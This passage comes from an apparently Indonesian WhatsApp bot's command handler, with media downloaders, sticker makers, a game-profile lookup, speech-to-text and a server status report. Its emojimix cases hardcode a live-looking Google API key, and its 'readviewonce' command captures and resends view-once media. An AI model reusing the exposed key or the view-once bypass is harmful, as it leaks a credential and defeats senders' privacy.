      if (!ts) return '-'
      const diff = Math.floor(Date.now() / 1000) - parseInt(ts)
      if (diff < 60)     return 'Baru saja'
      if (diff < 3600)   return `${Math.floor(diff/60)} menit lalu`
      if (diff < 86400)  return `${Math.floor(diff/3600)} jam lalu`
      if (diff < 604800) return `${Math.floor(diff/86400)} hari lalu`
      return `${Math.floor(diff/604800)} minggu lalu`
    }

    const brRank  = getBRRank(acc?.BrRankPoint || 0)
    const csRank  = getCSRank(acc?.CsRankPoint || 0)
    const brBar   = rankBar(acc?.BrRankPoint || 0, 6000)
    const csBar   = rankBar(acc?.CsRankPoint || 0, 3000)

const response = `
*= FREE FIRE STALKER =*

[ PROFIL ]
| Nama      : *${acc?.AccountName || '-'}*
| UID       : ${text}
| Server    : ${acc?.AccountRegion?.toUpperCase() || '-'}
| Level     : ${acc?.AccountLevel || '-'} (${(acc?.AccountEXP || 0).toLocaleString()} EXP)
| Like      : ${(acc?.AccountLikes || 0).toLocaleString()}
| Login     : ${timeAgo(acc?.AccountLastLogin)}
| Bergabung : ${formatDate(acc?.AccountCreateTime)}
| Bio       : ${social?.AccountSignature || 'Tidak ada bio'}

[ RANK ]
| BR  : ${brRank}
|      ${brBar} ${acc?.BrRankPoint || 0} RP
|      Max: ${getBRRank(acc?.BrMaxRank || 0)}
|
| CS  : ${csRank}
|      ${csBar} ${acc?.CsRankPoint || 0} RP
|      Max: ${getCSRank(acc?.CsMaxRank || 0)}

[ GUILD ]
${guild ? `| Nama   : ${guild.GuildName}
| Level  : ${guild.GuildLevel}
| Member : ${guild.GuildMember}/${guild.GuildCapacity}
${cap ? `| Kapten : ${cap.nickname} (Lv.${cap.level})` : ''}` : '| Tidak bergabung guild'}

[ PET ]
${pet ? `| Level : ${pet.level}
| EXP   : ${pet.exp}` : '| Tidak ada pet'}

[ INFO LAIN ]
| Credit Score  : ${credit?.creditScore || 100}/100
| Mode Favorit  : ${social?.AccountPreferMode?.replace('Prefermode_', '').toUpperCase() || '-'}
| Bahasa        : ${social?.AccountLanguage?.replace('Language_', '') || '-'}

Powered By ${global.ownername}.
`.trim()

    m.reply(response)
  } catch (err) {
    console.error(err)
    m.reply('❌ Error: ' + err.message)
  }
}
break

case 'ssweb': {
  try {
    if (!text) return m.reply(`Contoh: ${command}ssweb https://google.com`)
    if (!text.startsWith('http://') && !text.startsWith('https://')) {
      text = 'https://' + text
    }
    m.reply('⏳ Mengambil screenshot...')

    const encodedUrl = encodeURIComponent(text)
    const apiUrl = `https://api.screenshotmachine.com/?key=YOUR_KEY&url=${encodedUrl}&dimension=1366x768&format=jpg&cacheLimit=0`
    const ssUrl = `https://image.thum.io/get/width/1280/crop/720/noanimate/${text}`
    await NXL.sendMessage(m.chat, {
      image: { url: ssUrl },
      caption: `*Screenshot Web*\n\n> URL: ${text}\n> Powered By ${global.ownername}.`
    }, { quoted: m })

  } catch (err) {
    console.error(err)
    m.reply('❌ Gagal screenshot. Pastikan URL valid.')
  }
}
break

case "emojimix": {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return reply(`*Example: ${prefix+command} 😅 + 🤔*`)
if (!emoji2) return reply(`*Example: ${prefix+command} 😅 + 🤔*`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await NXL.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break

case "emojimix2": {
if (!text) return reply(`*Example: ${prefix+command} 😅*`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await NXL.sendImageAsSticker(m.chat, res.url, m, { packname: pushname, author: author, categories: res.tags })
await fs.unlinkSync(encmedia);
}
}
break

    case 'bratfoto':
    case 'brat': {
    if (!text) return reply('Mana Text Nya')
var image = `https://api.siputzx.my.id/api/m/brat?text=${text}&isAnimated=false&delay=500`
await NXL.sendImageAsSticker(m.chat, image, m, {packname: author})
NXL.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
break

case 'brat2':
    case 'bratvid':
    case 'bratvideo': {
    if (!text) return reply('Mana Text Nya')
var image = `https://api.siputzx.my.id/api/m/brat?text=${text}&isAnimated=true&delay=500`
await NXL.sendImageAsSticker(m.chat, image, m, {packname: author})
NXL.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
break

case "tiktok":
      case "tt":
        {
          let momok = "`𝗧 𝗜 𝗞 𝗧 𝗢 𝗞 - 𝗗 𝗢 𝗪 𝗡 𝗟 𝗢 𝗔 𝗗`";
          if (!text.startsWith("https://")) {
            return reply("url");
          }
          await tiktokDl(q).then(async result => {
            await NXL.sendMessage(m.chat, {
              react: {
                text: "🕖",
                key: m.key
              }
            });
            if (!result.status) {
              return reply("Error!");
            }
            if (result.durations == 0 && result.duration == "0 Seconds") {
              let araara = new Array();
              let urutan = 0;
              for (let a of result.data) {
                let imgsc = await prepareWAMessageMedia({
                  image: {
                    url: `${a.url}`
                  }
                }, {
                  upload: NXL.waUploadToServer
                });
                await araara.push({
                  header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: `Foto Slide Ke *${urutan += 1}*`,
                    hasMediaAttachment: true,
                    ...imgsc
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                  })
                });
              }
              const msgii = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                  message: {
                    messageContextInfo: {
                      deviceListMetadata: {},
                      deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: "*TIKTOK - DOWNLOADER*"
                      }),
                      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: araara
                      })
                    })
                  }
                }
              }, {
                userJid: m.sender,
                quoted: m
              });
              await NXL.relayMessage(m.chat, msgii.message, {
                messageId: msgii.key.id
              });
            } else {
              let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark");
              await NXL.sendMessage(m.chat, {
                video: {
                  url: urlVid.url
                },
                caption: momok,
                footer: `\n${namabot}`,
                buttons: [{
                  buttonId: `.toaudio`,
                  buttonText: {
                    displayText: "ᴀᴍʙɪʟ ᴍᴜsɪᴋɴʏᴀ"
                  }
                }],
                viewOnce: true
              }, {
                quoted: m
              });
            }
          }).catch(e => console.log(e));
          await NXL.sendMessage(m.chat, {
            react: {
              text: "✅",
              key: m.key
            }
          });
        }
        break;

case "pin":
      case "pinterest":
      await NXL.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
        {
          async function pinterest(query) {
            try {
              const { data } = await axios.get(
                `https://api-faa.my.id/faa/pinterest?q=${encodeURIComponent(
                  query
                )}`
              );

              return data.result[
                Math.floor(Math.random() * data.result.length)
              ];
            } catch (err) {
              throw Error(err.message);
            }
          }

          if (!text) return m.reply(`*Penggunaan Salah!*\ncontoh: .${command} NXL`);
          try {
            let hasil = await pinterest(text);
            if (!hasil) return m.reply("Gambar tidak ditemukan.");
            const buttons = [
              {
                buttonId: `.pin ${text}`,
                buttonText: {
                  displayText: "Next",
                },
                type: 1,
              },
            ];

            await NXL.sendMessage(
              m.chat,
              {
                image: { url: hasil },
                caption:
                  "Lanjut mencari gambar yang sama? Klik tombol *Next* dibawah ini",
                footer: `${author}`,
                buttons: buttons,
                headerType: 1,
                viewOnce: true,
              },
              { quoted: m }
            );
          } catch (err) {
            console.error(err.message);
            m.reply("Terjadi kesalahan");
          }
        }

        break;

case "gimage": {
  if (!text) return m.reply(`『 🎨 Gemini Image 』\n\n◇ Contoh: .gimage anime girl with sword`)

  await m.reply(`『 🎨 』 Generating gambar *${text}*...`)

  try {
    const prompt = encodeURIComponent(text)
    const seed = Math.floor(Math.random() * 99999)
    const url = `https://image.pollinations.ai/prompt/${prompt}?seed=${seed}&width=1024&height=1024&nologo=true&enhance=true`

    const imageRes = await fetch(url)
    const buffer = Buffer.from(await imageRes.arrayBuffer())

    await NXL.sendMessage(m.chat, {
      image: buffer,
      caption: `『 🎨 *AI Image Generator* 』\n「 ${text} 」\n◆━━━━━━━━━━━━━━━━◆\n🌸 *${storename}* 🌸`
    }, { quoted: m })

  } catch (e) {
    m.reply(`❌ Gagal generate gambar.\n${e.message}`)
  }
}
break

case 'play':
case 'song': {
  if (!text) return m.reply(`*Penggunaan Salah!*\nContoh: .${command} Night Change`)
  try {
    await m.reply(`『 🎵 』 Mencari *${text}*...`)

    const res = await axios.get(`https://api.lexcode.biz.id/api/dwn/ytplay?q=${encodeURIComponent(text)}`, {
      timeout: 30000
    })

    const data = res.data?.result
    if (!data) return m.reply('❌ Lagu tidak ditemukan.')

    const audioUrl = data.download?.audio
    if (!audioUrl) return m.reply('❌ Gagal mendapatkan audio, coba lagi.')

    await NXL.sendMessage(m.chat, {
      image: { url: data.thumbnail },
      caption: `『 🎵 *Music Downloader* 』\n「 ${data.title} 」\n◆━━━━━━━━━━━━━━━━◆\n◇ Durasi  : ${data.duration}\n◇ Channel : ${data.channel}\n◇ Views   : ${data.views}\n\n_Mengirim audio..._ 🎶`
    }, { quoted: m })

    await NXL.sendMessage(m.chat, {
      audio: { url: audioUrl },
      mimetype: 'audio/mpeg',
      ptt: false
    }, { quoted: m })

  } catch (e) {
    m.reply(`❌ Error: ${e.message}`)
  }
}
break

case "swgroup":
case "swgrup": {
  if (!isCreator) return m.reply(mess.owner)
  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || "";
  const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
  const jid = m.chat;

  if (/image/.test(mime)) {
    const buffer = await quoted.download();
    await NXL.sendMessage(jid, { groupStatusMessage: { image: buffer, caption } });
    m.reply("\xe2\x9c\x85")
  } else if (/video/.test(mime)) {
    const buffer = await quoted.download();
    await NXL.sendMessage(jid, { groupStatusMessage: { video: buffer, caption } });
    m.reply("\xe2\x9c\x85")
  } else if (/audio/.test(mime)) {
    const buffer = await quoted.download();
    await NXL.sendMessage(jid, { groupStatusMessage: { audio: buffer } });
    m.reply("\xe2\x9c\x85")
  } else if (caption) {
    await NXL.sendMessage(jid, { groupStatusMessage: { text: caption } });
    m.reply("\xe2\x9c\x85")
  } else {
    await reply(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
  }
}
break

case 'ttsearch':
case 'tiktoksearch':
case 'caratt': {
  if (!text) return m.reply(`*Cari video TikTok*\nContoh: .ttsearch kucing lucu`)

  await m.reply(`🔍 Mencari TikTok: *${text}*...`)
  await NXL.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

  try {
    const res = await axios.get(
      `https://tikwm.com/api/feed/search?keywords=${encodeURIComponent(text)}&count=10&cursor=0&hd=1`,
      { headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 20000 }
    )

    const items = res.data?.data?.videos || []
    if (!items.length) {
      await NXL.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
      return m.reply('❌ Video tidak ditemukan untuk: ' + text)
    }

    const results = items.slice(0, 3)

    await m.reply(`✅ Ditemukan ${items.length} video, mengunduh ${results.length} teratas...`)

    const sendOneTikTok = async (v, idx) => {
      const videoId = v.video_id || v.id
      const tiktokUrl = `https://www.tiktok.com/@${v.author?.unique_id || 'user'}/video/${videoId}`

      const cap = `🎵 *TikTok Result ${idx + 1}/${results.length}*\n` +
        `👤 *Akun:* @${v.author?.unique_id || v.author?.nickname || '-'}\n` +
        `📝 *Deskripsi:* ${(v.title || v.desc || '').slice(0, 150)}\n` +
        `❤️ *Likes:* ${(v.digg_count || 0).toLocaleString()}\n` +
        `▶️ *Views:* ${(v.play_count || 0).toLocaleString()}\n\n` +
        `_Powered by ${ownername}_`

      const result = await tiktokDl(tiktokUrl)

      if (!result || !result.status) throw new Error('tiktokDl gagal: status false')

      if (result.durations == 0 && result.duration == "0 Seconds") {
        let araara = []
        let urutan = 0
        for (let a of result.data) {
          let imgsc = await prepareWAMessageMedia(
            { image: { url: `${a.url}` } },
            { upload: NXL.waUploadToServer }
          )
          araara.push({
            header: proto.Message.InteractiveMessage.Header.fromObject({
              title: `Foto Slide Ke *${urutan += 1}*`,
              hasMediaAttachment: true,
              ...imgsc
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
              buttons: [{
                name: "cta_url",
                buttonParamsJson: `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
              }]
            })
          })
        }
        const msgii = await generateWAMessageFromContent(m.chat, {
          viewOnceMessageV2Extension: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: cap }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: araara })
              })
            }
          }
        }, { userJid: m.sender, quoted: m })
        await NXL.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })

      } else {
        let urlVid = result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
        if (!urlVid) throw new Error('URL nowatermark tidak ditemukan')
        await NXL.sendMessage(m.chat, {
          video: { url: urlVid.url },
          caption: cap,
          mimetype: 'video/mp4'
        }, { quoted: m })
      }
    }

    let gagal = 0
    for (let i = 0; i < results.length; i++) {
      const v = results[i]
      await m.reply(`⏬ Mengunduh video ${i + 1}/${results.length}...`)

      let berhasilKirim = false
      for (let attempt = 1; attempt <= 2; attempt++) {
        try {
          await sendOneTikTok(v, i)
          berhasilKirim = true
          break
        } catch (e) {
          console.error(`[TTSEARCH video ${i + 1} attempt ${attempt} error]`, e.message)
          if (attempt < 2) {
            await new Promise(r => setTimeout(r, 3000))
          }
        }
      }

      if (!berhasilKirim) {
        gagal++
        const cap = `🎵 *TikTok Result ${i + 1}/${results.length}*\n` +
          `👤 *Akun:* @${v.author?.unique_id || '-'}\n` +
          `📝 *Deskripsi:* ${(v.title || v.desc || '').slice(0, 100)}\n` +
          `❤️ *Likes:* ${(v.digg_count || 0).toLocaleString()}\n\n` +
          `_Powered by ${ownername}_`
        await m.reply(`⚠️ Video ${i + 1} gagal diunduh.\n\n${cap}`)
      }

      if (i < results.length - 1) await new Promise(r => setTimeout(r, 4000))
    }

    if (gagal === results.length) {
      await NXL.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
      await m.reply('❌ Semua video gagal. Coba lagi nanti.')
    } else {
      await NXL.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
    }

  } catch (e) {
    console.error("[TTSEARCH ERROR]", e.message)
    await NXL.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
    m.reply('❌ Gagal mencari TikTok: ' + e.message)
  }
}
break

case 'instagram':
case 'igdl':
case 'ig':
case 'igdownload':
case 'igvideo':
case 'igimage':
case 'igvid':
case 'igimg': {
  if (!text) return m.reply('❌ Masukkan link Instagram!\nContoh: .igdl https://www.instagram.com/p/xxx')
  if (!text.match(/instagram\.com\/(p|reel|tv|stories|share)/gi)) return m.reply('❌ URL Instagram tidak valid.\nContoh yang valid:\n- instagram.com/p/xxx\n- instagram.com/reel/xxx')

  await NXL.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })
  await m.reply('⏳ Sedang mengunduh dari Instagram...')

  try {
    const res = await igdl(text)

    if (res && res.status && res.result && res.result.downloadUrl && res.result.downloadUrl.length > 0) {
      const { metadata, downloadUrl } = res.result
      const cap = `🎬 *Instagram Downloader*\n👤 *User:* ${metadata?.username || '-'}\n📝 *Caption:* ${(metadata?.caption || '').slice(0, 200) || '-'}\n\n_Powered by ${ownername}_`

      for (const url of downloadUrl) {
        try {
          const isImage = url.includes('.jpg') || url.includes('.jpeg') || url.includes('.png') || url.includes('.webp') || url.includes('ftype=jpg')
          if (isImage) {
            await NXL.sendMessage(m.chat, { image: { url }, caption: cap }, { quoted: m })
          } else {
            await NXL.sendMessage(m.chat, { video: { url }, caption: cap }, { quoted: m })
          }
        } catch (e) {
          console.error("[IGDL media send error]", e.message)
        }
      }
      await NXL.sendMessage(m.chat, { react: { text: '✅', key: m.key } })

    } else {
      await NXL.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
      m.reply('❌ Gagal mengunduh. Pastikan:\n1. Link valid dan postingan publik\n2. Bukan link expired\n3. Coba lagi sebentar lagi')
    }

  } catch (error) {
    console.error("[IGDL ERROR]", error.message)
    await NXL.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
    m.reply('❌ Terjadi kesalahan saat download Instagram.\n' + error.message)
  }
}
break;

case 'removebg':
case 'nobg':
case 'hapusbackground': {
  const rbgMsg = m.quoted || (isMedia ? m : null)
  if (!rbgMsg) return m.reply(`Kirim/reply gambar dengan caption *${prefix + command}*`)

  const rbgMime = (rbgMsg.msg || rbgMsg).mimetype || rbgMsg.mimetype || mime || ""
  if (!/image|webp/.test(rbgMime)) {
    return m.reply(`❌ Hanya gambar/stiker yang bisa diremovebg.\nFormat terdeteksi: *${rbgMime || 'tidak diketahui'}*`)
  }

  await NXL.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })
  const prosesMsg = await NXL.sendMessage(m.chat, { text: '⏳ Memproses remove background...' }, { quoted: m })

  try {
    const buffer = await rbgMsg.download()
    if (!buffer || buffer.length < 100) return m.reply("❌ Gagal mengambil gambar.")

    let resultUrl = await removeBgV1(buffer)

    if (!resultUrl) {
      await NXL.sendMessage(m.chat, { text: '⏳ Server 1 gagal, mencoba server 2...', edit: prosesMsg.key })
      resultUrl = await removeBgV2(buffer)
    }

    if (!resultUrl) {
      await NXL.sendMessage(m.chat, { text: '⏳ Server 2 gagal, mencoba server 3...', edit: prosesMsg.key })
      resultUrl = await removeBgV3(buffer)
    }

    if (!resultUrl) {
      await NXL.sendMessage(m.chat, { text: '⏳ Server 3 gagal, mencoba server 4...', edit: prosesMsg.key })
      resultUrl = await removeBgV4(buffer)
    }

    if (!resultUrl) {
      await NXL.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
      await NXL.sendMessage(m.chat, { text: '❌ Semua server gagal. Coba lagi dalam beberapa saat.', edit: prosesMsg.key })
      return
    }

    const resultBuffer = await getBuffer(resultUrl)
    if (!resultBuffer || resultBuffer.length < 100) {
      await NXL.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
      return m.reply("❌ Gagal mengambil hasil gambar.")
    }

    await NXL.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
    await NXL.sendMessage(m.chat, {
      image: resultBuffer,
      caption: `✅ *Background Berhasil Dihapus*\n_Powered by ${ownername}_`
    }, { quoted: m })

  } catch (error) {
    console.error("[REMOVEBG ERROR]", error.message)
    await NXL.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
    m.reply(`❌ Gagal remove background. Coba lagi dalam beberapa saat.`)
  }
}
break

case "suarateks":
case "stt": {
  const contextInfo = m.message?.extendedTextMessage?.contextInfo
  const quotedMsg = contextInfo?.quotedMessage
  const audioMsg = quotedMsg?.audioMessage || quotedMsg?.pttMessage

  if (!audioMsg) return m.reply("*Reply voice note/audio dulu!*")

  try {
    await m.reply("『 🎙️ 』 Mengkonversi suara ke teks...")

    const stream = await downloadContentFromMessage(audioMsg, "audio")
    const chunks = []
    for await (const chunk of stream) chunks.push(chunk)
    const audioBuffer = Buffer.concat(chunks)

    const form = new FormData()
    form.append("file", new Blob([audioBuffer], { type: "audio/ogg" }), "audio.ogg")
    form.append("model", "whisper-large-v3-turbo")
    form.append("response_format", "json")
    form.append("language", "id")

    const res = await fetch("https://api.groq.com/openai/v1/audio/transcriptions", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${global.groqKey}`
      },
      body: form,
      signal: AbortSignal.timeout(30000)
    })

    const rawText = await res.text()
    let json
    try {
      json = JSON.parse(rawText)
    } catch {
      return m.reply(`❌ Server error:\n${rawText.slice(0, 300)}`)
    }

    if (json?.error) return m.reply(`❌ Groq Error: ${json.error?.message || json.error}`)

    const teks = json?.text
    if (!teks) return m.reply(`❌ Gagal konversi.\n${JSON.stringify(json)}`)

    await NXL.sendMessage(m.chat, {
      text: `『 🎙️ *Speech to Text* 』\n◆━━━━━━━━━━━━━━━━◆\n\n${teks}\n\n◆━━━━━━━━━━━━━━━━◆\n🌸 *${storename}* 🌸`
    }, { quoted: m })

  } catch (e) {
    m.reply(`❌ Error: ${e.message}`)
  }
}
break
case "debugquoted": {
  const raw = JSON.stringify(m.message, null, 2).slice(0, 1000)
  return m.reply(`raw: ${raw}`)
}
break
case 'ping':
case 'statusbot':
case 'botstatus': {
    const { performance } = require('perf_hooks')
    const os = require('os')
    const fs = require('fs')
    const moment = require('moment-timezone')
    const QuickChart = require('quickchart-js')

    let timestamp = m.messageTimestamp ? (typeof m.messageTimestamp === 'number' ? m.messageTimestamp : m.messageTimestamp.low) : (Date.now() / 1000);
    let now = Date.now();
    let latensi = now - (timestamp * 1000);

    const startProcess = performance.now()

    let osName = 'Unknown OS'
    try {
        if (process.platform === 'linux' && fs.existsSync('/etc/os-release')) {
            const osInfo = fs.readFileSync('/etc/os-release', 'utf8')
            const nameMatch = osInfo.match(/^NAME="?(.+?)"?$/m)
            const verMatch = osInfo.match(/^VERSION="?(.+?)"?$/m)
            const name = nameMatch ? nameMatch[1].replace(/"/g, '') : ''
            const version = verMatch ? verMatch[1].replace(/"/g, '') : ''
            osName = `${name} ${version}`.trim()
        } else if (process.platform === 'win32') osName = 'Windows'
        else if (process.platform === 'darwin') osName = 'macOS'
        else osName = os.type()
    } catch {
        osName = os.type()
    }

    const rtimage = (seconds) => {
        const d = Math.floor(seconds / (3600 * 24))
        const h = Math.floor((seconds % (3600 * 24)) / 3600)
        const m = Math.floor((seconds % 3600) / 60)
        const s = Math.floor(seconds % 60)
        return `*${d}* Hari *${h}* Jam *${m}* Menit`
    }

    const runtimeFormat = (seconds) => {
        const d = Math.floor(seconds / (3600 * 24))
        const h = Math.floor((seconds % (3600 * 24)) / 3600)
        const m = Math.floor((seconds % 3600) / 60)
        const s = Math.floor(seconds % 60)
        return `*${d}* ☀️ Hari\n│ *${h}* 🕐 Jam\n│ *${m}* ⏰ Menit\n│ *${s}* ⏱️ Detik`
    }

    const formatp = (bytes) => `${(bytes / 1024 / 1024 / 1024).toFixed(2)} GB`

    const getCpuUsage = async (delay = 100) => {
        const start = os.cpus()
        await new Promise(r => setTimeout(r, delay))
        const end = os.cpus()
        let idleDiff = 0, totalDiff = 0

        for (let i = 0; i < start.length; i++) {
            const s = start[i].times
            const e = end[i].times
            const idle = e.idle - s.idle
            const total = Object.keys(s).reduce((a, t) => a + (e[t] - s[t]), 0)
            idleDiff += idle
            totalDiff += total
        }
        return 100 - Math.round((idleDiff / totalDiff) * 100)
    }

    const cpuUsagePercent = await getCpuUsage()

    const cpus = os.cpus()
    const avgSpeed = cpus.reduce((a, c) => a + c.speed, 0) / cpus.length
    const cpuModel = cpus[0]?.model?.trim() || 'Unknown CPU'
    const cpuCore = cpus.length

    const mem = os.totalmem()
    const free = os.freemem()

    let swapTotal = 0, swapFree = 0
    try {
        if (fs.existsSync('/proc/meminfo')) {
            const info = fs.readFileSync('/proc/meminfo', 'utf8')
            const swapTotalMatch = info.match(/^SwapTotal:\s+(\d+)/m)
            const swapFreeMatch = info.match(/^SwapFree:\s+(\d+)/m)
            swapTotal = swapTotalMatch ? parseInt(swapTotalMatch[1]) * 1024 : 0
            swapFree = swapFreeMatch ? parseInt(swapFreeMatch[1]) * 1024 : 0
        }
    } catch {}

    const totalMemAll = mem + swapTotal
    const usedMemAll = (mem - free) + (swapTotal - swapFree)
    const percentUsed = totalMemAll > 0 ? (usedMemAll / totalMemAll) * 100 : 0

    const runtimeText = runtimeFormat(process.uptime())
    const waktu = moment().tz("Asia/Jakarta").format('HH:mm:ss')
    const tanggal = moment().tz("Asia/Jakarta").locale("id").format('dddd, D MMMM YYYY')

    const endProcess = performance.now()
    const responInSeconds = ((endProcess - startProcess) / 1000).toFixed(4)

    const val = parseFloat(responInSeconds);
    let p = 0;

    if (val >= 1.0000) p = 100;
    else if (val <= 0.0001) p = 0;
    else if (val <= 0.0010) p = 0 + ((val - 0.0001) / (0.0010 - 0.0001)) * 20;
    else if (val <= 0.0100) p = 20 + ((val - 0.0010) / (0.0100 - 0.0010)) * 20;
    else if (val <= 0.1000) p = 40 + ((val - 0.0100) / (0.1000 - 0.0100)) * 20;
    else if (val <= 0.6000) p = 60 + ((val - 0.1000) / (0.6000 - 0.1000)) * 20;
    else p = 80 + ((val - 0.6000) / (1.0000 - 0.6000)) * 20;

    const chart = new QuickChart();
    chart.setVersion('3');
    chart.setWidth(500);
    chart.setHeight(300);
    chart.setConfig({
        type: 'bar',
        data: {
            labels: [''],
            datasets: [
                { label: 'Safe', data: [20], backgroundColor: '#32CD32', barPercentage: 1, categoryPercentage: 1 },
                { label: 'Low Risk', data: [20], backgroundColor: '#ADFF2F', barPercentage: 1, categoryPercentage: 1 },
                { label: 'Warning', data: [20], backgroundColor: '#FFFF00', barPercentage: 1, categoryPercentage: 1 },
                { label: 'High Risk', data: [20], backgroundColor: '#FFA500', barPercentage: 1, categoryPercentage: 1 },
                { label: 'Critical', data: [20], backgroundColor: '#FF0000', barPercentage: 1, categoryPercentage: 1 },
            ],
        },
        options: {
            indexAxis: 'y',
            layout: { padding: { top: 60, bottom: 20, left: 20, right: 20 } },
            scales: {
                x: {
                    stacked: true, min: 0, max: 100,
                    ticks: {
                        display: true, color: '#999', maxRotation: 45, minRotation: 45,
                        font: { size: 10 },
                        callback: (val) => {
                            const l = {0:'0.0001', 10:'0.0003', 20:'0.0010', 30:'0.0030', 40:'0.0100', 50:'0.0300', 60:'0.1000', 70:'0.3000', 80:'0.6000', 90:'0.8000', 100:'1.0000'};
                            return l[val] || '';
                        }
                    },
                    grid: { display: false }
                },
                y: { display: false, stacked: true }
            },
            plugins: {
                legend: { display: false },
                tooltip: { enabled: false },
                annotation: {
                    clip: false,
                    annotations: {
                        text: {
                            type: 'label',
                            xValue: p, yValue: 0, yAdjust: -125,
                            content: [`Respond: ${responInSeconds}s`],
                            color: 'black', font: { size: 14, weight: 'bold' },
                            position: 'center', backgroundColor: 'transparent'
                        },
                        panah: {
                            type: 'point', xValue: p, yValue: 0, yAdjust: -100,
                            pointStyle: 'triangle', rotation: 180, radius: 8,
                            backgroundColor: 'black', borderColor: 'black'
                        },
                        garis: {
                            type: 'line', xMin: p, xMax: p, yMin: -0.5, yMax: 0.5,
                            borderColor: 'black', borderWidth: 2, borderDash: [6, 4]
                        }
                    }
                }
            }
        }
    });

    let pingIcon
    if (latensi < 100) pingIcon = "🟢"
    else if (latensi < 300) pingIcon = "🔵"
    else if (latensi < 600) pingIcon = "🟡"
    else if (latensi < 1000) pingIcon = "🟠"
    else pingIcon = "🔴"

    const response = `
╭───⏱️ *[ STATUS BOT ]* ⏱️
│
├ 💠 *Ping:* ${pingIcon} ${latensi.toFixed(0)} ms
├ 💠 *Respon:* ${responInSeconds} detik
│
├ 📈 *Uptime:*
│  ${runtimeText}
│
├ 🖥️ *Server Info:*
│  🔵 Platform : ${os.platform()}
│  💻 OS        : ${osName}
│  🧿 Hostname : ${os.hostname()}
│  🌎 Zona      : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
│  🧠 CPU       : ${cpuModel}
│  🔩 Core      : ${cpuCore} Core
│  ⚡ Speed     : ${avgSpeed.toFixed(2)} MHz
│
├ 📊 *RAM Usage:*
│  ${formatp(usedMemAll)} / ${formatp(totalMemAll)} (${percentUsed.toFixed(1)}%)
│
├ ⚡ *CPU Usage:*
│  ${cpuUsagePercent.toFixed(1)}% dari ${cpuCore} Core
│
├ 🗓️ *Tanggal:* ${tanggal}
├ 🕒 *Waktu:* ${waktu} WIB
╰─────────────────────
`.trim()

    NXL.sendMessage(m.chat, {
      text: response,
      contextInfo: {
        externalAdReply: {
          title: "🏓 Status bot online >.<",
          body: namabot,
          thumbnailUrl: chart.getUrl(),
          sourceUrl: "https://store.NXLhost.web.id",
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })
}
break

case "rvo": case "readviewonce": {
 if (!isCreator) return reply(mess.owner);
if (!m.quoted) return reply("reply pesan viewOnce nya!")
let msg = m?.quoted?.message?.imageMessage || m?.quoted?.message?.videoMessage || m?.quoted?.message?.audioMessage || m?.quoted
if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce) return reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg, msg.mimetype == 'image/jpeg' ? 'image' : msg.mimetype == 'video/mp4' ? 'video' : 'audio')
    let type = msg.mimetype
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return NXL.sendMessage(m.chat, {video: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return NXL.sendMessage(m.chat, {image: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
